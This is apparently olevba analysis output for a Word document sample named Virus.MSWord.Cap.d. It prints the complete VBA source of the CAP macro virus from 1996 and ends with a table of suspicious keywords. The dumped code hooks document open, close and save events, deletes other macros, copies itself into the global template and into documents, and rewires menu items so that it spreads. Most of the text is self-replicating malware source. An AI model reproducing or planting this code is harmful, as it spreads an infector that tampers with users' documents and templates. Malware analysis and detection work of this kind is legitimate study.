olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cap.d-f50edc72858e4191680af804470f9c8f961e954e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cap.d-f50edc72858e4191680af804470f9c8f961e954e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Cap.d-f50edc72858e4191680af804470f9c8f961e954e - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Cap.d-f50edc72858e4191680af804470f9c8f961e954e - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%59"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Cap.d-f50edc72858e4191680af804470f9c8f961e954e - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%SA"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
On Error Resume Next
WordBasic.Call "CAP.FSA"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Cap.d-f50edc72858e4191680af804470f9c8f961e954e - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%C"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
On Error Resume Next
WordBasic.Call "CAP.FC"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Cap.d-f50edc72858e4191680af804470f9c8f961e954e - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
On Error Resume Next
WordBasic.Call "CAP.S", WordBasic.[FileName$]()
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Cap.d-f50edc72858e4191680af804470f9c8f961e954e - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%S"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
On Error Resume Next
WordBasic.Call "CAP.FS"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Cap.d-f50edc72858e4191680af804470f9c8f961e954e - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%O"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
On Error Resume Next
WordBasic.Call "CAP.FO"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Cap.d-f50edc72858e4191680af804470f9c8f961e954e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
On Error Resume Next
WordBasic.Call "CAP.S", WordBasic.[FileName$]()
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Cap.d-f50edc72858e4191680af804470f9c8f961e954e - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
On Error Resume Next
WordBasic.DisableAutoMacros 0
WordBasic.Call "CAP.S", ""
End Sub
-------------------------------------------------------------------------------
VBA MACRO CAP.bas 
in file: Virus.MSWord.Cap.d-f50edc72858e4191680af804470f9c8f961e954e - OLE stream: 'Macros/VBA/CAP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim M__$()
Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.CAP.MAIN"
ReDim M__$(9)
'C.A.P: Un virus social.. y ahora digital..
'"j4cKy Qw3rTy" (jqw3rty@hotmail.com).
'Venezuela, Maracay, Dic 1996.
'P.D. Que haces gochito ? Nunca seras Simon Bolivar.. Bolsa !
End Sub
Private Sub S(F$)
Dim S_$
Dim D$
Dim C$
Dim B$
Dim A$
Dim M_
Dim N
Dim T
Dim I
Dim J
Dim K
Dim D_ As Object
On Error Resume Next
S_$ = "F%"
D$ = "Macro"
C$ = "Close"
B$ = "Open"
A$ = "File"
M__$(0) = "CAP"
M__$(3) = A$ + C$
M__$(5) = A$ + "Save"
M__$(2) = A$ + B$
M__$(9) = A$ + "Templates"
A$ = "Auto"
M__$(6) = M__$(5) + "As"
M__$(1) = A$ + B$
M__$(8) = A$ + "Exec"
M__$(4) = A$ + C$
M__$(7) = "Tools" + D$
M_ = 0
N = 0
For T = 1 To 0 Step -1
For I = WordBasic.CountMacros(T) To 1 Step -1
B$ = WordBasic.[MacroName$](I, T)
If S_$ = WordBasic.[Left$](WordBasic.[MacroDesc$](B$), 2) Then
For J = 0 To 9
If B$ = M__$(J) Then
If T Then N = N + 1 Else M_ = M_ + 1
J = 9
End If
Next
Else
WordBasic.ToolsMacro Name:=B$, Show:=T + T + 1, Delete:=1
End If
Next
Next
If F$ <> "" Then
If M_ < 10 And N Then
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, FastSaves:=1, AutoSave:=1, SaveInterval:="10"
For I = 0 To 9
If I <> 7 Then K = -1 Else K = 0
WordBasic.MacroCopy F$ + ":" + M__$(I), M__$(I), K
Next
B$ = S_$ + WordBasic.[LTrim$](Str(WordBasic.Val(Mid(WordBasic.[MacroDesc$](M__$(7)), 3)) + 1))
WordBasic.ToolsMacro Name:=M__$(7), Show:=1, Description:=B$, SetDesc:=1
A$ = WordBasic.[MenuText$](0, 1)
For I = WordBasic.CountMacros(1) To 1 Step -1
J = 0
B$ = WordBasic.[MacroName$](I, 1)
Select Case WordBasic.[MacroDesc$](B$)
Case S_$ + "O"
J = 2
Case S_$ + "C"
J = 3
Case S_$ + "S"
J = 5
Case S_$ + "SA"
J = 6
End Select
If J Then
C$ = WordBasic.[MenuItemMacro$](A$, 0, J)
If WordBasic.[Left$](UCase(C$), Len(M__$(J))) <> UCase(M__$(J)) And WordBasic.[Left$](C$, 1) <> "(" Then WordBasic.MacroCopy F$ + ":" + B$, C$, K
End If
Next
T = -1
For I = 0 To 1
If I Then J = 1 Else J = 6
A$ = WordBasic.[MenuText$](I, J)
J = WordBasic.CountMenuItems(A$, I) - 1
For M_ = J To 1 Step -1
If InStr(WordBasic.[MenuItemMacro$](A$, I, M_), D$) Then
If I Then
B$ = WordBasic.[MenuItemMacro$](A$, I, M_ - 2)
If UCase(B$) <> UCase(M__$(9)) And WordBasic.[Left$](B$, 1) <> "(" Then WordBasic.MacroCopy M__$(9), B$, K
Else
M_ = M_ + 1
End If
For T = M_ To M_ - 1 Step -1
If T > 3 Then WordBasic.ToolsCustomizeMenus MenuType:=I, Position:=T, Name:=WordBasic.[MenuItemMacro$](A$, I, T), Menu:=A$, Remove:=1, Context:=0
Next
M_ = 1
T = 0
End If
Next
Next
If T Then
For I = 6 To J
If WordBasic.[Left$](WordBasic.[MenuItemMacro$](A$, 1, I), 1) = "(" And WordBasic.[Left$](WordBasic.[MenuItemMacro$](A$, 1, I - 2), 1) = "(" Then
For T = 1 To 3 Step 2
B$ = WordBasic.[MenuItemMacro$](A$, 1, I - T)
If WordBasic.[Left$](B$, 1) <> "(" Then WordBasic.MacroCopy M__$(T + 6), B$, K
Next
I = J
End If
Next
End If
End If
Set D_ = WordBasic.DialogRecord.FileSaveAs(False)
Set D_ = WordBasic.CurValues.FileSaveAs
If N < 10 And D_.Format = 1 Or D_.Format = 0 Or D_.Format = 6 Then
D_.Format = 1
For I = WordBasic.CountMacros(0) To 1 Step -1
B$ = WordBasic.[MacroName$](I, 0)
If B$ <> M__$(7) Then K = -1 Else K = 0
WordBasic.MacroCopy B$, F$ + ":" + B$, K
Next
WordBasic.FileSaveAs D_
End If
End If
Err.Number = 0
End Sub
Private Sub FO()
On Error Resume Next
WordBasic.DisableAutoMacros
On Error GoTo -1: On Error GoTo E
Dim D As Object: Set D = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen D
WordBasic.Dialog.FileOpen D
WordBasic.FileOpen D
S (D.Name)
E:
End Sub
Private Sub FC()
On Error Resume Next
WordBasic.DisableAutoMacros
S WordBasic.[FileName$]()
WordBasic.FileClose
End Sub
Private Sub FS()
On Error Resume Next
WordBasic.DisableAutoMacros
On Error GoTo -1: On Error GoTo F
WordBasic.FileSave
S WordBasic.[FileName$]()
F:
End Sub
Private Sub FSA()
Dim T
Dim W$
On Error Resume Next
WordBasic.DisableAutoMacros
On Error GoTo -1: On Error GoTo G
Dim D As Object: Set D = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs D
If D.Format <> 1 Then
WordBasic.Dialog.FileSaveAs D
WordBasic.FileSaveAs D
S (D.Name)
Else
T = WordBasic.Window()
W$ = D.Name
WordBasic.FileNew Template:=WordBasic.[FileName$]()
On Error GoTo -1: On Error GoTo H
WordBasic.CurValues.FileSaveAs D
D.Name = W$
WordBasic.Dialog.FileSaveAs D
WordBasic.FileSaveAs D
On Error GoTo -1: On Error GoTo G
S (D.Name)
If T >= WordBasic.Window() Then T = T + 1
WordBasic.WindowList T
H:
WordBasic.FileClose 2
End If
G:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

